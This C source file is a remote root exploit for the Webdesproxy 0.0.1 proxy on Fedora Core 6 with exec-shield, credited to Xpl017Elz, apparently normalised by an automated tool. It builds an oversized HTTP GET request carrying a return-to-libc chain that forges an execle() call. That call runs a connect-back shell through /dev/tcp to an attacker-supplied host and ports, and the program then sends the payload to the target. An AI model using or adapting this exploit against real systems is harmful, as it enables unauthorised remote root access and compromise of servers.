#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct in_addr {int dummy; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_zero; struct in_addr sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef  int /*<<< orphan*/  ex_buf ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 long BIN_SH_END ; 
 long BIN_SH_LOC ; 
 long CONN_BACK_LOC ; 
 long C_OPTION_END ; 
 long C_OPTION_LOC ; 
 long EXECLE_00_0xff ; 
 long EXECLE_08_0xff ; 
 long EXECLE_16_0xff ; 
 long EXIT_GOT ; 
 long EXIT_PLT ; 
 long MOVE_ESP ; 
 long NULL_STR ; 
 long RET_CODE ; 
 int RET_CODE_COUNT ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 long STRCPY_PLT ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  bzero (int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  close (int) ; 
 int connect (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  exit (int /*<<< orphan*/ ) ; 
 struct hostent* gethostbyname (char*) ; 
 int /*<<< orphan*/  htons (int) ; 
 int /*<<< orphan*/  memset (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  send (int,unsigned char*,int,int /*<<< orphan*/ ) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  sprintf (unsigned char*,char*,...) ; 
 int strlen (unsigned char*) ; 

int main(int argc,char *argv[]){
	int i=0,l=0,sock;
	unsigned char ex_buf[4096];

	struct hostent *se;
	struct sockaddr_in saddr;

	memset((char *)ex_buf,0,sizeof(ex_buf));
	printf("\n Fedora Core 6 (exec-shield) based\n"
		" Webdesproxy (webdesproxy-0.0.1.tgz) remote root exploit\n"
		" by Xpl017Elz\n\n");

	if(argc<6){
		printf(" Usage: %s [host] [port] [conn-back host] [input port] [output port]\n",argv[0]);
		printf(" Example: %s webdesproxy.host.co.kr 8080 hax0r.kr 8282 8383\n\n",argv[0]);
		return -1;
	}

	sprintf(ex_buf,"GET http://");
	l=strlen(ex_buf);
	for(i=0;i<220;i++){
		ex_buf[l++]=0x78;
	}
	i=0;

	printf(" [+] make execle() address.\n");
	{
		/* (execle()>>0)&0xff */
		*(long *)&ex_buf[l]=STRCPY_PLT;
		l+=4;
		*(long *)&ex_buf[l]=MOVE_ESP;
		l+=4;
		*(long *)&ex_buf[l]=EXIT_GOT+i++;
		l+=4;
		*(long *)&ex_buf[l]=EXECLE_00_0xff;
		l+=4;
		/* (execle()>>8)&0xff */
		*(long *)&ex_buf[l]=STRCPY_PLT;
		l+=4;
		*(long *)&ex_buf[l]=MOVE_ESP;
		l+=4;
		*(long *)&ex_buf[l]=EXIT_GOT+i++;
		l+=4;
		*(long *)&ex_buf[l]=EXECLE_08_0xff;
		l+=4;
		/* (execle()>>16)&0xff */
		*(long *)&ex_buf[l]=STRCPY_PLT;
		l+=4;
		*(long *)&ex_buf[l]=MOVE_ESP;
		l+=4;
		*(long *)&ex_buf[l]=EXIT_GOT+i++;
		l+=4;
		*(long *)&ex_buf[l]=EXECLE_16_0xff;
		l+=4;
	}
	/* #1 make null byte */
	*(long *)&ex_buf[l]=STRCPY_PLT;
	l+=4;
	*(long *)&ex_buf[l]=MOVE_ESP;
	l+=4;
	*(long *)&ex_buf[l]=BIN_SH_END; // "/bin/sh\0"
	l+=4;
	*(long *)&ex_buf[l]=NULL_STR;
	l+=4;

	/* #2 make null byte */
	*(long *)&ex_buf[l]=STRCPY_PLT;
	l+=4;
	*(long *)&ex_buf[l]=MOVE_ESP;
	l+=4;
	*(long *)&ex_buf[l]=C_OPTION_END; // "-c\0"
	l+=4;
	*(long *)&ex_buf[l]=NULL_STR;
	l+=4;

	printf(" [+] execle() argument align padddding...\n");
	for(i=0;i<RET_CODE_COUNT;i++){
		*(long *)&ex_buf[l]=RET_CODE; /* ret(pop %eip) code */
		l+=4;
	}

	printf(" [+] make execute command.\n");
	{
		/*
		** --
		** execle("/bin/sh","/bin/sh","-c",conn-back_shell,0x00000000,0x00000000);
		** --
		*/
		*(long *)&ex_buf[l]=EXIT_PLT; /* exit PLT */
		l+=4;
		*(long *)&ex_buf[l]=0x82828282; /* dummy */
		l+=4;
		*(long *)&ex_buf[l]=BIN_SH_LOC; /* argv[0] */
		l+=4;
		*(long *)&ex_buf[l]=BIN_SH_LOC; /* argv[1] */
		l+=4;
		*(long *)&ex_buf[l]=C_OPTION_LOC; /* argv[2] */
		l+=4;
		*(long *)&ex_buf[l]=CONN_BACK_LOC; /* argv[3] */
		l+=4;
	}

	printf(" [+] make connect-back shell command.\n");
	{
		/* overwrite .bss section */
		sprintf(ex_buf+l,"/bin/shx-cxsh</dev/tcp/%s/%d>/dev/tcp/%s/%d;\n",argv[3],atoi(argv[4]),argv[3],atoi(argv[5]));
		l=strlen(ex_buf);
	}

	printf(" [+] connect host: %s:%d.\n",argv[1],atoi(argv[2]));
	se=gethostbyname(argv[1]);
	if(se==NULL){
		printf(" [-] gethostbyname() error.\n\n");
		return -1;
	}
	sock=socket(AF_INET,SOCK_STREAM,0);
	if(sock==-1){
		printf(" [-] socket() error.\n\n");
		return -1;
	}
	saddr.sin_family=AF_INET;
	saddr.sin_port=htons(atoi(argv[2]));
	saddr.sin_addr=*((struct in_addr *)se->h_addr);
	bzero(&(saddr.sin_zero),8);

	i=connect(sock,(struct sockaddr *)&saddr,sizeof(struct sockaddr));
	if(i==-1){
		printf(" [-] connect() error.\n\n");
		return -1;
	}

	printf(" [+] exploit size: %d.\n",l);
	printf(" [+] send exploit.\n");
	send(sock,ex_buf,l,0);
	close(sock);

	printf(" [*] checking, your connect-back host. :-}\n\n");
	exit(0);
}